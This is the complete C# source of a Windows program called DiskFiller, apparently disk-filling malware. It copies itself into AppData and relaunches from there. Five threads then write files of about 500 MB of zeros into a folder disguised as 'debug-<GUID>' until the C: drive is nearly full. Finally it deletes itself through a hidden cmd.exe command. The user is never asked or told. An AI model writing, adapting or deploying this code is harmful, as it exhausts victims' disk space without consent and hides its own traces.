using System;
using System.IO;
using System.Linq;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;



namespace DiskFiller
{
    internal partial class DiskFiller : Form
    {
        internal struct ApplicationPaths
        {
            internal string appdata;
            internal string currentFolder;
            internal string currentFullPath;
            internal string diskFillerFolder;
        }



        private readonly string applicationName = string.Empty;
        private readonly ApplicationPaths finalPaths;
        private readonly string fileContent;


        internal DiskFiller()
        {
            InitializeComponent();



            // Check if application should run
            if (GetFreeDiskSpace(@"C:\") <= 4)
            {
                DestroySelf();
            }



            finalPaths = GetApplicationPaths();

            applicationName = finalPaths.currentFullPath.Replace(finalPaths.currentFolder, string.Empty).Substring(1);



            // Check if current path is the wanted path
            if (finalPaths.currentFolder.Equals(finalPaths.appdata) == false)
            {
                string newApplicationPath = $@"{finalPaths.appdata}\{applicationName}";

                // Copy application from the current path to appdata
                CopyFile(finalPaths.currentFullPath, newApplicationPath);

                Thread.Sleep(1000);

                // Start from the new path
                try
                {
                    Process.Start(newApplicationPath);
                }
                catch { }

                Thread.Sleep(2000);

                DestroySelf();
            }



            // Prepare the content which will be written to the files
            string fileContent = PrepareFileContent();



            // Create folder for filling if necessary
            if (Directory.Exists(finalPaths.diskFillerFolder) == false)
            {
                try
                {
                    Directory.CreateDirectory(finalPaths.diskFillerFolder);
                }
                catch
                {
                    DestroySelf();
                }
            }



            StartDiskFilling(fileContent);
        }



        /// <summary>
        /// Gets the free space of a disk with a given name
        /// </summary>
        /// 
        /// <param name="diskName"> For example -> "C:\" or "D:\" </param>
        /// 
        /// <returns>
        /// The free disk space in gb
        /// </returns>
        private double GetFreeDiskSpace(string diskName)
        {
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                if (drive.IsReady && drive.Name.Equals(diskName))
                {
                    return drive.TotalFreeSpace / (1024 * 1024 * 1024);
                }
            }

            return -1;
        }



        /// <summary>
        /// Delete application in 1 second and close the process in the meantime
        /// </summary>
        private void DestroySelf()
        {
            try
            {
                Process.Start(new ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Application.ExecutablePath + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
            }
            catch
            {

            }

            Environment.Exit(0);
        }



        /// <summary>
        /// Gets all the needed folder paths and the current file name for further purpose
        /// </summary>
        /// 
        /// <returns>
        /// A struct which is defined at the beginning of the file but with all the values filled
        /// </returns>
        private ApplicationPaths GetApplicationPaths()
        {
            ApplicationPaths appPaths = new ApplicationPaths()
            {
                appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                currentFullPath = Application.ExecutablePath
            };

            string currentFullPath = appPaths.currentFullPath;

            appPaths.diskFillerFolder = $@"{appPaths.appdata}\debug-{Guid.NewGuid()}";
            appPaths.currentFolder = currentFullPath.Replace(currentFullPath.Split(Convert.ToChar(@"\")).Last(), string.Empty);
            appPaths.currentFolder = appPaths.currentFolder.Substring(0, appPaths.currentFolder.Length - 1);

            return appPaths;
        }



        /// <summary>
        /// Copies a file from one path to another
        /// </summary>
        /// 
        /// <param name="sourcePath"> Path from which the file should be copied </param>
        /// <param name="targetPath"> The new path where the file will land </param>
        private void CopyFile(string sourcePath, string targetPath)
        {
            try
            {
                // Make sure that no file exists already because this could lead to an exception
                File.Delete(targetPath);

                Thread.Sleep(500);

                File.Copy(sourcePath, targetPath);
            }
            catch
            {
                DestroySelf();
            }
        }



        /// <summary>
        /// Fills a string with much 0's (about 500mb)
        /// </summary>
        /// 
        /// <returns>
        /// The filled string with 500mb worth of 0's
        /// </returns>
        private string PrepareFileContent()
        {
            string fileContent = "0000";

            for (int i = 0; i < 27; i++)
            {
                fileContent += fileContent;
            }

            return fileContent;
        }



        /// <summary>
        /// Starts the main process, creates 5 threads and writes to files
        /// </summary>
        /// <param name="fileContent"></param>
        private void StartDiskFilling(string fileContent)
        {
            for (int i = 0; i < 5; i++)
            {
                Thread thread = new Thread(() =>
                {
                    WriteToFiles(fileContent);
                });

                thread.Start();
            }
        }



        /// <summary>
        /// Writes to a fíle as long as the disk has at least 4gb of space
        /// </summary>
        /// 
        /// <param name="fileContent"> The content which will be written to the files </param>
        private void WriteToFiles(string fileContent)
        {
            while (true)
            {
                if (GetFreeDiskSpace(@"C:\") <= 4)
                {
                    DestroySelf();
                    return;
                }

                try
                {
                    File.AppendAllText($@"{finalPaths.diskFillerFolder}\{Guid.NewGuid()}.txt", fileContent);
                }
                catch
                {
                    DestroySelf();
                }
            }
        }
    }
}